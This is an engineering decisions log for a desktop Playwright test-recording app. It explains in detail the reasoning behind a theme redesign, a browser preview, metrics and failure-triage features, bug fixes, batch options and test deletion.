**`renderer/dev/specimen.tsx` — every primitive in every state at `/?view=specimen`.** Worth its place because nothing in the suite has ever *seen* one of these rendered; without it, the first look at a `StatusChip` would be inside a Phase B screen, where a spacing mistake is indistinguishable from a mistake in the screen itself. Measured there in a real engine rather than asserted: all seven chips exactly 78.00px sharing one right edge, the ramp's dead band identical across three samples while the ends differ, the selected-and-failing row carrying both shadows, and the CRT at z-610 reporting `filter: none` with a scanline layer mounted over the rest of the page. It also confirmed the A2 fonts in genuine use for the first time — Space Mono at 700 for labels, Space Grotesk for prose.

**Coverage:** 113 new Vitest tests (1910 total) and three new checks (41 total). Verified failing-when-broken for all eight of the new guards' scenarios — the chip sized by a literal, a second rule re-sizing it, an active segment turned phosphor, a hover written out in red, a filter on the CRT screen, the z-index "tidied" down, a scanline overlay added inside the bezel, and a status hex written into a stylesheet — plus the two selection tests that had been vacuous.

### 2026-08-08 — The redesign's foundation: tokens we declare ourselves, fonts that never phone home, and a motion floor

Phase A2 of [REDESIGN.md](REDESIGN.md). `renderer/theme/` — tokens, self-hosted Space Mono + Space Grotesk, the three atmosphere layers, the reduced-motion floor, and `check:theme-tokens`. **Nothing consumes it.** The app is unchanged on screen, which is the point: A3 (primitives) and A4 (shell) are the PRs that start reading it, and a foundation that lands silently means a regression in Phase B has exactly one candidate cause.

**Why the redesign gets its own token layer instead of retheming the SDK's.** The stated reason in the plan is fidelity — zero radius, hairline boxes, inset status rails and fixed status widths are not variants `cva` has. The reason that actually forced it is this repo's own history: `bg-muted` and the whole `border-token-*` family emitted **no CSS at all** and styled nothing for months (2026-08-06, below). Both were found by accident. `type-check` does not check SDK component props on this tree — `<Text color="totally-not-a-color">` compiles clean, which is why `check:text-color` exists — and a class that does not resolve is invisible in a `.tsx`, because the failure is not an error. The declaration is simply dropped and the element inherits. A `var(--gl-x)` read against a name declared in a file we own has a different failure mode: it is a string in one file, checkable against declarations in another. That is `check:theme-tokens`, and it is the argument for the whole layer.

**Two palette rules are load-bearing, not cosmetic, and both are encoded rather than described.** *Colour means outcome* — pass, fail, flaky, running, and nothing else. The direct consequence is that selection is neutral white at low alpha (`--gl-sel-bg` / `--gl-sel-ring`) and never a status hue, because on a row that is both selected and failing the two treatments would be arguing about what the colour reports. *AI is not a status, so it gets a treatment rather than a colour* — the holo gradient, on borders and small marks only, never a text fill, because `background-clip: text` costs enough contrast to stop a 9.5px uppercase label being readable. `check:selection-neutral` (A3) is what carries the first rule to the next contributor, who will reasonably reach for the accent colour.

**The font mapping lives in the `@font-face` ranges, not at the call sites.** Space Mono ships 400 and 700 and nothing else; the design leans on 500 and 600 heavily. REDESIGN §3.2 asks for an explicit 500 → 400 / 600 → 700 mapping rather than depending on font-synthesis, *because which of round-or-synthesise an engine does differs across engines* — so the Glaze WebView and the browser preview would disagree about what the app looks like, on exactly the surface the preview exists to check. Declaring the 400 file as `font-weight: 100 500` and the 700 file as `600 900` is that mapping, expressed in the one place the font stack consults: every request matches a real face, so no synthesis happens at all and there is nothing left for an engine to disagree about. Verified by ink-coverage measurement in the preview rather than by eye, because a monospaced face has identical advance widths at every weight and `measureText` cannot see the difference: 500 renders byte-identically to 400, 600 to 700, and 400 ≠ 700. Space Grotesk needed none of it — the woff2 carries `fvar`/`gvar`/`avar`, and 400/500/600 measured as three genuinely distinct weights.

**No network fallback in the font stack, deliberately.** The mockup pulls both families from `fonts.googleapis.com`. In a packaged desktop app that is an outbound request to a third party on every launch, against a stated egress posture of one opt-in summary-only webhook (2026-08-04). The tempting shape is a local `src` with a CDN fallback — and that is worse, because it is a fallback nobody ever sees fire: the app would quietly start phoning out the day someone mispathed an asset. A missing file now falls through to the system font, which is legible, obviously wrong to a designer, and sends nothing. `check:theme-tokens` also asserts each file's `wOF2` magic, because a proxied or rate-limited download leaves behind an HTML error page with the right extension.

**The grain plate is 400 bytes instead of 4.2MB.** REDESIGN §3.5 budgets the texture assets under 400KB combined, converted to WebP. An inline `feTurbulence` data URI meets that by three orders of magnitude, has no resolution to be wrong at, and needs no asset pipeline — the PNG plate was always going to look like noise at 3.8% opacity, and this *is* noise. The `ember` texture plate is the remaining piece and its source art is not in this repo; it first matters in B1 (home's full-bleed plate), not here.

**The reduced-motion floor, and the asymmetry that will look like a bug to whoever simplifies it.** The mockup's three levels are right: `alive`, `calm` (ambient motion stops, status pulses continue), `still`. The distinction is exactly correct, because **motion that reports something is not decoration** — a running step pulses *because it is running*, and stopping it deletes information rather than chrome. The rule the mockup does not state and this adds: `prefers-reduced-motion: reduce` forces `calm` as a **floor**. Someone who has already told their OS they want less motion should not then have to find a setting in this app. The clamp is one-directional — `still` survives it untouched, because that user asked for less than the floor and gets to keep it. Both directions are pinned in the tests, since `if (prefersReducedMotion) return "calm"` is a one-character simplification that restores motion to the person who asked for least and leaves every other assertion passing.

Three implementation choices there each cost a real failure to find, so: the two kinds of motion are separated by a `data-gl-motion="ambient"` marker rather than by animation name, because CSS cannot select on animation-name and threading a flag through every inline animation string gets missed on the one element nobody re-tested. `!important` is required, not lazy — the redesign applies animation shorthand inline, and a motion setting that loses to the thing it is meant to turn off is worse than no setting. And `resolveAtmo` is read through `useSyncExternalStore` rather than `useState` + `useEffect`, because with an effect the first paint runs at the requested level: the one frame a motion-sensitive user sees would be the animated one.

**The layers are portalled to `document.body`.** All three are `position: fixed`, and a fixed element inside an ancestor carrying `transform`, `filter` or `backdrop-filter` positions against *that ancestor* instead of the viewport. Not hypothetical: the glitch and texture treatments this design is built on are exactly those properties. The failure would be a vignette covering one panel instead of the window, appearing only on whichever screens were reskinned last.

**Where the `@import`s sit is a correctness question, not a style one.** `@import` must precede every other at-rule, and the SDK's build *prepends* its two framework imports to `renderer/styles.css` — so ours only stay legal above the `@source` lines. Below them they are dropped by any pipeline that does not inline first, and the symptom is a stylesheet that silently loses the entire theme. Pinned, line-anchored: the first version of that assertion matched the words "@source directives" in the file's own header comment and failed against a perfectly ordered stylesheet, which is a fair demonstration of why it is worth pinning at all.

**Coverage:** 14 Vitest tests plus `check:theme-tokens` (39 checks now, 1797 tests). Verified failing-when-broken for all ten guards — the clamp removed, the clamp made symmetric, the CRT default flipped, the portal removed, a typo'd token read, an unimported sheet, imports moved below `@source`, a token declared twice, `pointer-events` deleted from the overlay, and a font file moved away. Verified in the browser preview: all 24 tokens resolve, zero console errors, `window.__preview.misses` empty, no `data-atmo` on the root and zero atmosphere layers rendered — and no font request at all on a normal load, since `@font-face` is a declaration rather than a fetch.

### 2026-08-08 — The browser preview lands on main, and four things the WebView was doing for free

Ported `renderer/dev/` from `shell/electron`, where it had been since the pipeline work of 2026-08-07. The motivation is the redesign ([REDESIGN.md](REDESIGN.md)): it is almost entirely visual change, and seeing a UI change on this branch means claiming one global build slot shared by every branch and worktree. That bottleneck degrades quality directly — the checks that get skipped are the visual ones. This is the smallest slice of Phase 4b that fixes it, and it moves in the direction convergence is going anyway.

**It is not a file copy, because `main` has no Vite config.** The SDK owns the real renderer's build (`node glaze.ts build`) and marks the framework's own dependencies external, because the packaged app supplies them at runtime. A browser tab supplies nothing, so `vite.config.preview.ts` is a second, standalone config that bundles everything and points every specifier somewhere real. It reproduces exactly three things the SDK's build does — the two framework CSS imports prepended to `renderer/styles.css`, the `__APP_DISPLAY_NAME__` define, and the React + Tailwind plugin pair. SDK discovery walks up from the config file rather than counting `..` hops, the same idiom `glaze.ts` and `vitest.config.ts` already use for the same worktree reason.

**Four things the native WebView provides that a browser tab does not.** Each was found by opening the page, not by reading code:

- **`color-scheme`.** Every `Text` in this app resolves to `text-inherit`, so the base colour comes from the UA default: white in a dark-appearance WKWebView, black in a tab. Nothing in the SDK's CSS, `renderer/styles.css` or `main-window.html` sets a body colour — the app has simply never needed to. The first render of the preview was legible chrome with every single label black on black. It is declared off the `.dark` CLASS rather than the media query, so switching theme in Settings is honoured too.
- **An opaque canvas.** `--color-window-bg` is 40% black; the real window is translucent and composites onto the native macOS material. The backstop goes on `html`, BEHIND body — deliberately not by overriding `--color-window-bg`, because DECISIONS 2026-08-06 established that every `bg-panel` surface is visible *only* thanks to that compositing. Make the window background opaque and the panels silently flatten.
- **`--background` is already an SDK token.** The first version of `preview.html` used that name for its own canvas variable, copied from `main-window.html`. The design system declares it too, its stylesheet loads later, and it won — the preview's value was simply never used. Namespaced to `--preview-canvas`. `main-window.html` has the same collision and does not care, because the real window is transparent.
- **`createMemoryHistory()`.** The router uses it — correct for an app that loads over `file://`, where a browser history would put filesystem paths in the URL. The consequence is that a URL path can never select a view: `/stats` loads the app at its initial route and `pushState` does nothing the router can see. Rather than change the app's router for the preview's benefit, the preview asks the router directly: `?view=stats`, `?test=<id>`. The SPA fallback in the Vite config still earns its place — it makes a stale link land on the app rather than a Vite 404 — but it does not, and cannot, route.

**The typed handlers caught eight shape drifts on the way in**, which is the entire argument for annotating them. `llm:detect` returns one status *per provider*, not one overall; `LlmConfig` is `{ provider, model, baseUrls }`, not `{ provider, baseUrl, model }`; `alerts:status` is `{ hasUrl, host }`; `tests:secretStatus` is an array; `llm:hasApiKey`/`llm:isActive` return objects, not booleans; `tests:listFlows` returns a narrowed row; `batch:status` is `BatchState | null` where idle is `null`, not a half-filled object; and `TestSpeed` has no `"normal"` — the electron fixtures had all of these wrong against `main`. A runtime coverage test pins channel NAMES and cannot see any of it; only the type-checker can.

**Six channels are new on `main` since the port**, and three of them had to be handled rather than left to the default rule. `metrics:stepHealth`, `metrics:slowness` and `metrics:divergence` all answer `{ available, … }` and every panel destructures it — `defaultFor` would hand back `null`, which is a crash rather than a degraded panel. They report `available: true` with rows, because "metrics are off on this runtime" is the state you get for free by not handling the channel at all.

**One miss is answered rather than recorded, and that needed its own guard.** `@glaze/core/components` invokes `nativeImage:createFromNamedImage` itself — it is the design system's channel, not api.ts's, so it warned on every single page load. A warning that always fires teaches everyone to ignore the miss list, and the miss list is the whole drift-detection mechanism. It moved into a separate `SDK_CHANNELS` map, exempt from the api.ts coverage assertion. That exemption is only legitimate while those channels really are the SDK's, so a third test asserts they are absent from api.ts *and* that the list is non-empty — otherwise the assertion would pass vacuously.

**The test file is a `.ts` that needs a `window`.** It matched neither Vitest project's globs and was silently never run; `renderer/dev/**/*.test.ts` is now listed in the `dom` project explicitly. It reads api.ts through Vite's `?raw` rather than `fs`: `__dirname` is not defined when linting `renderer/` as browser code, and `import.meta.url` under jsdom is an `http://` URL that `fileURLToPath` rejects. `?raw` also means the path is resolved at build time, so moving api.ts fails the import instead of quietly reading nothing.

**`preview.html`'s filename is load-bearing.** The SDK's build discovers windows with `readdirSync(appRoot).filter(f => f.endsWith("-window.html"))`. Rename it to anything matching that and the preview — fake backend, fixture data and all — ships inside the packaged app. Verified: `npm run build` emits only the three real windows. Noted in the file itself, since the mechanism is invisible from the outside.

**Coverage:** 9 tests. Verified failing-when-broken for all four guards — a renamed channel (caught by three tests independently), a `slowed` list that is not a subset of `rows`, and an SDK exemption that names an app channel. The type-checker's catch was demonstrated the same way: `TestSpeed` rejected `"normal"` before the file ever ran.

### 2026-08-08 — Phase 4: the views the join makes possible, and two vacuous tests

Step Health, suite slowness and cross-browser divergence, plus the flake
analysis moving into `shared/` so `get_flake_report` serves the same verdicts
the app's Stability panel shows.

**The move retired a copy, and the check that guarded it.**
`renderer/lib/recorder-types.ts` carried a hand-written mirror of
`StabilityVerdict` and `MIN_RUNS_FOR_VERDICT`, kept honest by an assertion in
`check:flake-analysis` — necessary, because a renderer cannot import from
`main/`. It can import from `shared/`, so the mirror is gone. But the assertion
then compared the re-exported constant against itself: a test that passes
forever and proves nothing. It is now a SOURCE assertion that the renderer
declares no threshold of its own, which is strictly stronger and is the only
form that can see a copy being reintroduced.

**`insufficient` is not `clean`, and this is the whole feature.** 255 of the 305
steps on this machine have only ever run on one engine. Folding those into
"clean" would give a suite that has never been tried outside Chromium a clean
bill of cross-browser health — the most misleading thing this view could do, and
nothing on screen would look wrong. The same rule shaped the panel copy: the
"no step disagrees across engines" reassurance is withheld unless at least one
step was actually compared, and a component test pins that. Writing that test is
what caught the panel doing exactly the wrong thing.

**Percentiles moved out of SQL after SQLite disagreed with itself.**
`stepDurations` first took each percentile by `LIMIT 1 OFFSET <expression over
aggregates of the same window>`. SQLite accepted that for p95 and rejected it
for p50 with "datatype mismatch" — and because `metrics-query`'s `all()`
swallows a throw by contract (the DB is a cache; a failed read is a missing
answer, never an error worth propagating), the broken half came back as `null`
and was indistinguishable from "this step has never been timed". It was visible
only because a probe against the real database showed rows with a p95 and no
p50, which is arithmetically impossible. The arithmetic is now four lines of JS
over at most `window * 2` numbers per step. **The general lesson is about the
swallow, not the SQL:** a layer that turns every failure into "no data" makes
broken queries look like empty ones, so anything non-trivial in it needs a test
that runs the real statement. `check:metrics-db` now does.

**The instrumentation figure excludes the speed setting.** `capture_ms` and
`a11y_ms` are measured per run. Slow-motion delay is exactly derivable but is
spread across steps rather than recorded as a total, so folding it in would put
an estimate in the same sentence as two measurements with nothing saying which
was which. It is reported separately, per speed, instead. Measured here: only
4% of 9,814 seconds is instrumentation — so the panel's honest answer on this
history is "your suite is not slow because of capture".

**A second vacuous test, found the same way.** "An unmeasured duration renders
as a dash, never a zero" was written negatively — assert no `0ms` on screen —
and passed against a component with the guard deleted, because the formatter
returned a dash anyway. Rewritten positively (the cell holds exactly `—`, and
the opposite case renders `120ms–800ms`), it fails on that mutation. Both of
this phase's vacuous tests were negative assertions; that is the shape to
distrust.

**One duplication kept, and named.** The MCP finds a run's failure line with
`firstErrorLine`; the app uses `extractError`. They agree on ordinary failures,
and `firstErrorLine` is the better of the two — it skips Playwright's "Error
Context:" pointer. Converging them is an app-side behaviour change with its own
check, so it is written down in `mcp/server.mjs` rather than folded into this
phase. Stability verdicts are unaffected either way: they come from run
outcomes, not error text.

### 2026-08-08 — Triage: the verdict is the summary, the evidence is the product

Phase 3 of the MCP-and-test-intelligence plan. `shared/triage.mjs` answers "is
this the site's fault or mine?" for one failed run, surfaced as the MCP's
`triage_run` and as a line in the run Output panel.

Every signal it uses was already on disk before it existed. What was missing was
the join, and Phase 2 built exactly that — `runEvidence()` and `siblingRuns()`
were written for this caller by name. So the interesting decisions here are all
about **what to claim**, not how to compute it.

**Weights, not booleans.** "The page's own JS threw on the failing step" and
"the screenshot differs" are both site-ward and are not the same claim. A flat
count of matched rules makes the weak one able to outvote the strong one three
to one. Scale is deliberately coarse — 3/2/1 — because anything finer implies a
precision the underlying data does not have.

**`limits` costs confidence per entry, not once.** This started as a flat "were
there any limits" penalty and the check caught it: a run that captured nothing
AND has no siblings AND dropped its console is three separate blind spots, and
pricing that the same as one reads as "we looked and found little" when it means
"we could barely look". There is a floor, because the limits are about what is
MISSING — an observed 5xx is still a 5xx however much else went unrecorded.

**Absence is only evidence when the absence is real.** The clean-wait signal —
"we waited for something that never came while every request succeeded and the
page threw nothing" — is the classic wrong-locator shape and the single most
useful runner-ward signal available. It is also the only one argued from an
absence, so it is gated on `console_dropped`/`network_dropped` being zero. The
capture fixture caps those per RUN, not per step; on a busy site whole steps
keep no requests at all, and one real run here dropped 1,861 network entries.
Without the gate, "no failing request on that step" reads as evidence the site
was healthy. When the gate fires the claim is withdrawn INTO `limits` rather
than dropped silently, so the reason is visible.

**No `triage` column.** Deliberate, and already anticipated by the note against
the `runs` table in `metrics-schema.mjs`: a verdict frozen at the classifier
version that wrote it goes stale silently, and a trend then mixes verdicts from
several generations with nothing saying so. Triage is pure and cheap, so it is
computed on read — which also means improving it improves every historical run
at once.

**The MCP could not read its own database.** `mcp/metrics.mjs` had `handle()`,
which returns a handle only if this process had already recorded a run. The rule
behind it is right — a read tool must not CREATE the database, or it writes an
empty schema nobody backfills — but it had been implemented as "never open one",
which made every read tool useless in a fresh MCP process, i.e. every MCP
process that has not itself run a test. `readHandle()` splits the two: open an
existing file, never create, and return null on a version mismatch rather than
dropping (dropping is a write; the app rebuilds on its next start).

**`TRIAGE_COHORT` lives in `shared/`, not in both callers.** The classifier
takes no view on the sibling window — it classifies whatever it is handed — but
the app and the MCP must choose the same one, or the same run triaged from the
two surfaces gives two different answers and neither is wrong.

**Measured on the real history, not just fixtures.** 269 failed runs on this
machine: 53 site, 55 runner, 2 mixed, **159 unknown**. That 59% looked like a
classifier gap and is not one — 114 of those runs captured no artifacts at all,
124 have no identifiable failing step, and 141 were only ever run on a single
engine. The evidence genuinely is not there, which is the case `unknown` exists
for, and the suggested next step for all of them is to re-run with capture on.
It does mean the feature's usefulness scales with capture being switched on, and
that is the honest thing to know about it.

Pinned by `check:triage`: every row of the plan's signal table in BOTH
directions, the two cross-run signals proved mutually exclusive, and a
source-level assertion — like `a11y-diff.test.ts` — that the file contains no
`runStatus`, no `exitCode` and no `throw`. Four mutations were run against the
finished check; the fourth found a **vacuous test** (a passed-run guard asserted
against a fixture carrying no signals, so it passed with or without the guard)
and the fixture was loaded until it could fail.

### 2026-08-08 — Two variables bugs with one root: the record was the draft

"Cannot create a new standalone variable" turned out to be the visible half of a
structural mistake. The Variables panel rendered straight from `TestRecord`, and
every keystroke round-tripped through `tests:setVariables` → `normalizeVariables`,
which **drops** entries whose names aren't valid JS identifiers. So "Add variable"
persisted `{name: ""}`, the normalizer discarded it, the query invalidation
re-rendered from the record, and the row the user had just created vanished
before it could be named. The same mechanism deleted an EXISTING variable the
moment a rename passed through an invalid intermediate state — clear the field to
retype it and the variable was gone from disk.

The fix is not "validate harder before saving". It is that a text field being
edited is renderer state, not backend state. The panel now holds a local working
copy (seeded per test id, the same latch idiom `test-detail-view` uses for its
run controls) and only writes lists the backend will store **verbatim** — every
name a valid identifier, no duplicates. A held row keeps rendering with a visible
reason, so "not saved yet" is a state the user can see rather than a row that
disappears. Duplicates are held for the same reason: `normalizeVariables` keeps
the first of a pair, so a list containing one would not round-trip losslessly and
the second row would evaporate on the next refetch.

Rejected: mirroring the normalizer's rules into the renderer as a gate BEFORE the
mutation and keeping the record as the render source. That still loses the
in-progress text — the record has nothing to render for a half-typed name — so
the row would flicker or reset while typing. The duplicated regex that already
existed in the panel (as a warning) is exactly that idea half-applied, and it is
why the bug read as cosmetic for so long.

**The second bug came out of the first while reading the generator.**
`variableHeader()` returned nothing for a test with zero declared variables, but
`captureLine()` always emits `await glazeCapture(V, …)`. A test whose only
variable usage was a capture step therefore generated a spec that threw
`ReferenceError: V is not defined` on its first line. The header is now emitted
whenever a capture step exists. Worth noting: `script-generator.test.ts` already
asserted the broken output — it was pinning line alignment and happened to encode
the missing header as correct — which is a reminder that a test asserting on a
whole generated artifact can lock in a defect it wasn't looking at.

### 2026-08-08 — The AI-debug glow ends at the next run, not on a timer

The "these steps were just added by the AI" outline had no exit except the step
list changing for some other reason. Deliberate at the time (a timer would expire
while the user was still in the AI panel, before they ever switched to the Steps
tab), but it meant the green outline sat over steps a subsequent run had just
failed — the highlight vouching for work the run had already disproved.

The run is the right terminator because it is the moment the question changes
from "what did the AI change?" to "did it work?". Implemented as a `runEpoch`
counter on the recorder store rather than by lifting `newStepIds` out of
`test-detail-view`: there are two independent owners of a new-step set (the store,
for trainer insertions; the detail view, for applied script fixes) and a shared
counter lets both retire on the same event without moving state across a boundary
`check:step-glow` deliberately pins.

### 2026-08-08 — AI-debug completion: renderer decides WHEN, backend decides WHETHER

A finished AI debug job announced itself only by turning an icon green, which is
invisible if you minimized it and walked away — the exact case minimizing exists
for. Three additions, all gated on the dialog NOT being expanded (a job you are
watching needs no banner).

**The macOS notification is renderer-triggered, which is a compromise.** Run and
batch notifications fire from the backend because the backend owns run state. AI
debug completion has no backend event at all: the LLM stream terminates in the
renderer's session store, and `llm-service` knows only that a request ended, not
which session it belonged to or whether that session was minimized. So the
renderer calls a new `aiDebug:notifyDone` IPC. The consequence is honest and
accepted: no notification if the renderer is gone — acceptable, because the job
itself dies with the renderer too (see the 2026-08-06 session-persistence entry).
The **setting gate stays backend-side**, so a renderer bug can post at most a
no-op rather than banners the user switched off.

**Auto-accept is guarded by the send-time script hash, not by a confirmation.**
`scriptHash` already existed for the stale-script warning, stamped at SEND time
precisely because opening a session must not refresh it. Reusing it as the
auto-apply gate means the dangerous case — the user edited the script while the
model was thinking, and the model's answer describes a file that no longer exists
— can't happen: the hash differs, nothing is applied, and the toast says why. A
confirmation dialog was rejected because it defeats the point (the user isn't
there), and applying-then-offering-undo was rejected because the apply path
re-parses the spec and re-mints every step id, so "undo" would not be a restore.

### 2026-08-08 — The batch row already knew which run it was

`BatchTestResult.runRecordId` has been written since batches gained history, with
a comment saying it exists to link a persisted batch to its run log. Nothing in
the renderer ever read it, so the only route from "Beta failed" to the reason was
to remember the test name, go to Stats, and find the run by hand.

Making the status badge open `LogInspector` needed no new data and no new IPC —
only extracting that dialog out of `stats-view.tsx` so two views can mount it. The
badge is a button ONLY for a settled row that actually carries a run id: rows
still running have no finished log, and rows recorded before the field existed
would otherwise be dead buttons. The fuller idea from the notes — a step view with
console output pre-populated — is deliberately not this: `ReplayViewer` has no
console pane, and merging the two is a bigger piece of work than the drill-through
that unblocks the common question.

### 2026-08-07 — Routines is specified, not built, and the spec is the deliverable

Batch v2 — renamed "Routines", with scheduled runs and a Shopify-Flow-style builder — is substantially larger than everything else shipped this day put together, and most of its risk is in decisions made before any code. Writing [ROUTINES.md](ROUTINES.md) now, alongside the per-row Batch work, is what stops that work foreclosing it.

Three findings from writing it were worth having in hand while building the smaller feature:

**`batchTestOptions` is a dead end for Routines, and that is fine.** A `Record<testId, BatchRowOptions>` can hold exactly one configuration of each test, so "Smoke runs Login on Chromium headless" and "Nightly runs Login on all three engines" cannot both exist. It was still the right shape for one checklist — no new store, no migration, an absent entry is a working default — and Routines would introduce its own entity and migrate the map into a Routine named "Batch" on first launch. Knowing the exit exists is what made the cheap version safe to ship.

**`runFlow` is not the flow model, and conflating them is the main design risk.** `isFlow`/`flowParams`/`runFlow` already exist and already compose — but they inline one test's STEPS into another at generation time, producing one Playwright test. A Routine composes RUNS: separate processes, separate `RunRecord`s, separate rows in Stats. A builder that lets a Routine step reach inside a flow would be a second composition mechanism competing with the first.

**The lane invariant constrains the builder, not just the runner.** Because `runId === testId`, two Routine steps naming the same test can never run concurrently however the diagram is drawn. That has to be a save-time rejection rather than a silent serialisation: a builder that draws two parallel branches and runs them one after another is lying in a picture, which is worse than refusing to draw it.

The spec also recommends NOT renaming the `batch:*` IPC channels, `batch-history.json`, `RunRecord.batchId`, or the MCP `run_batch` tool. A rename reaching disk formats and external tool names costs a migration and breaks every MCP client with "unknown tool" rather than a redirect — and buys a word. The word is worth having in the UI, not in `run-history.json`.

### 2026-08-07 — Deleting a test: the name goes, the arithmetic stays

Deleting a test removed its record, spec, screenshots, baselines, annotations, secrets and heal journal — and left its run history, its raw logs, its AI-debug sessions and its recorder debug logs behind. The test vanished from the library and kept appearing in Stats under its last-known name.

**Run records are tombstoned, not deleted, and that was the whole decision.** Purging them is the tidier mental model and it was the obvious first design. It also means the pass rate, the last-week chart and the capture-overhead figures all change retroactively every time somebody removes a test. Those numbers answer "what has this machine done", and a number that rewrites its own history on an unrelated action is one people stop reading. So the records stay and `testDeleted: true` hides them from every surface that NAMES a test — the run table, the test filter, log search, Stability, and the MCP's `list_runs`.

**What actually gets destroyed is the identity and the content**: the raw `.log` (the one artifact here that quotes the site — page text, URLs, values typed while recording), the screenshots, and `testName`, which is denormalized into both `run-history.json` and `batch-history.json` precisely so they render without the library, and therefore outlives the test. Marking a row without clearing its name would have been bookkeeping for a row nothing renders; replacing the name with `DELETED_TEST_NAME` is what makes the tombstone do the job the user asked for.

**The visible cost is named rather than hidden.** "Total runs" now legitimately exceeds the rows listed beneath it. Two numbers disagreeing with no explanation reads as a bug in whichever one the reader trusts less, so the table says "N from deleted tests counted above, not listed" whenever they differ.

**AI-debug sessions and recorder debug logs are really deleted**, unlike run records: a session's content is the model quoting the script and the run output, neither contributes to any aggregate, and with the test gone there is no route left in the UI to reach or remove them. `aiDebugStore.deleteTest` filters on `testId` rather than parsing the `run:<id>` / `step:<id>:<n>` key — the key format is a renderer convention that would silently stop matching if it ever gained a third form.

**Every store is asserted separately in the regression suite, on purpose.** One combined "nothing is left" check passes vacuously the day someone adds a per-test store and forgets this handler — which is the exact failure this feature exists to prevent, and a completely silent one. Each cleanup call was reverted individually and confirmed to turn exactly one test red, including the inverse: making the tombstone a hard delete must fail "the pass rate does not move", or the trade-off above isn't actually pinned.

### 2026-08-07 — Batch options move into the rows, and one test can run on three engines

A batch had one browser and one headed/headless choice for the whole suite. "Run the checkout flow on all three engines, headless, but leave the login test headed on Chromium" was not expressible — and neither was running one test on more than one engine at all.

**The fan-out did NOT need a composite run id.** `runId === testId` runs through `playwright-runner`'s per-run maps and through the `runner:output`/`runner:step`/`runner:done` stream the renderer's run store is keyed by. The obvious reading is that one test producing three runs breaks that. It doesn't, because a dataset sweep already queues the same test several times and `buildLanes` already puts them in one lane that runs strictly sequentially. Queuing engines the same way — one entry per (test, engine), **contiguous per test** — reuses that whole mechanism: `playwright-runner.ts` is untouched, the event key is untouched, `stop()`'s kill-by-testId is untouched. The cost is real and worth naming: three engines for one test run one after another, not three-up. Lifting that would mean re-keying every per-run map AND the event contract the renderer consumes, for parallelism *inside* a single test that nobody asked for. Contiguity is the load-bearing part, and `check:batch-runner` pins it directly — interleave the engines across tests and both the ordering assertion and `maxLiveFor("a") === 1` go red.

**The concurrency clamp still counts distinct tests, not planned runs.** This looks wrong at a glance and there is a comment in the handler saying so, because lanes are per-testId: raising the clamp to the fan-out count leaves the extra workers idling on lanes that don't exist, and — worse — makes the headed-parallel dialog promise more browser windows than will ever open.

**An absent `batchTestOptions` entry is the default, not missing data.** That one decision removes the entire migration: an existing `recorder-settings.json` has no such key, so every test resolves from its own `runBrowser` and the global defaults, and entries are written only when a control is touched. The visible consequence, stated rather than hidden: on upgrade every test appears unticked and "Run" runs nothing until the user selects. That is the requested reversal of the old auto-tick applied consistently — the alternative, seeding every existing test as ticked once, would contradict it on exactly the first launch where it mattered.

**A row's engine list may never be empty.** A ticked test with zero engines contributes zero queue entries, so the batch runs fewer tests than the toolbar just said it would, with no error and no skipped row. Deselecting the last engine is therefore a no-op, `setRow` restores the previous list if a caller patches it away, the settings validator drops a stored row that came back empty, and the IPC handler drops such an entry so it falls back to the batch-wide browser. Four guards for one rule because every one of them is a place the rule could be violated silently.

**The master Headless overwrite lives in the event handler, never in an effect.** The init effect sets `runHeadless` from `defaultRunHeadless` on every mount. An effect keyed on `runHeadless` would therefore wipe every saved row choice each time the user merely visited the Batch view — silently, with the UI looking correct throughout. There is a test whose only job is "mounting writes nothing".

**`BROWSER_SF_SYMBOLS` is the wrong map for a row.** Its own header says so: SF Symbols exist for the SDK's native `Select`, whose options never enter the DOM. Rendering one in a DOM row goes through an async native bridge that returns `null` under jsdom, which would make every engine toggle render empty and the whole feature unassertable. The rows use `BrowserIcon` (lucide), and `aria-pressed` — not a class name — is what the tests assert, since that is both the accessibility contract and the thing that doesn't change when the styling does.

### 2026-08-07 — Two fixes for one bug, met in a merge

The MCP phases and the parallel-batch work landed within hours of each other and had independently found the same problem: the app and the standalone MCP server both write `<scriptsDir>/playwright.config.ts`, so whichever ran last is the one Playwright reads, and the two copies had drifted (the MCP's carried no `timeout` line).

The fixes were different. One kept a copy per process — `main/services/playwright-config-source.ts` and `mcp/playwright-config.mjs` — and pinned them byte-equal with `check:runner-config`, reasoning that the MCP "must run without the app build" and so cannot import from `main/`. The other collapsed them into `shared/playwright-config-source.mjs`.

**The shared one wins, because the premise behind the copy is not quite right.** The MCP genuinely cannot import from `main/` — but it can import from `shared/`, which is plain ESM with a hand-written `.d.mts` and no build step, exactly what `mcp/select-tests.mjs` has always been. So there is nothing left to compare and `check:runner-config` was rewritten to guard the property that actually keeps them in step: that no second copy comes back. It also now asserts each writer passes a per-run `PW_OUTPUT_DIR`, since a config field is only half of that behaviour.

What was kept from the copy-based fix, because it was better: `outputDir` driven by `PW_OUTPUT_DIR` (parallel lanes need separate scratch directories, and without it they silently share one), and write-if-different via an atomic rename. The WRITE deliberately stayed with each caller rather than moving to `shared/` — the app already had `writeIfChanged`, which every other fixture goes through and which handles same-process collisions and cleanup better than a generic one would, and passing `fs`/`path`/a temp suffix into a shared writer to preserve that module's no-I/O rule was more machinery than the problem needed. Only the CONTENT was ever what drifted.

`buildQueue` merged the same way round: `shared/batch-queue.mjs` gained the dedupe the parallel work added to it, since a repeated test id breaks the queue's structural guarantee that a test's entries sit together — which the app's lane grouping depends on, and which an agent passing `["a","b","a"]` can trigger.

### 2026-08-07 — MCP Phase 2: the metrics DB, and five columns the plan had wrong

Implements Phase 2 of [plans/mcp-and-test-intelligence.md](plans/mcp-and-test-intelligence.md). The phase order was reviewed before starting, per the maintainer's ask; no phase swap was warranted, but the review and the build together turned up seven corrections, five of them to the §3.2 schema.

**The `node:sqlite` risk closes better than the plan hoped.** §1.3 flagged "must survive the Vite/tsc build as an externalized builtin *in the packaged app*, not merely under `tsx`". It does — but the more important finding is *which Node*: the packaged backend runs on the host's **pinned** runtime (`app.glaze.macos.main/node/runtime/node-v24.14.1-darwin-arm64/bin/node`), not on the user's `PATH`. So a customer with Node 20 cannot break it, and the NDJSON fallback the plan held in reserve is not needed. `DatabaseSync` and `backup` were verified on that exact binary, and the build output confirms `import("node:sqlite")` stays a dynamic external rather than being bundled.

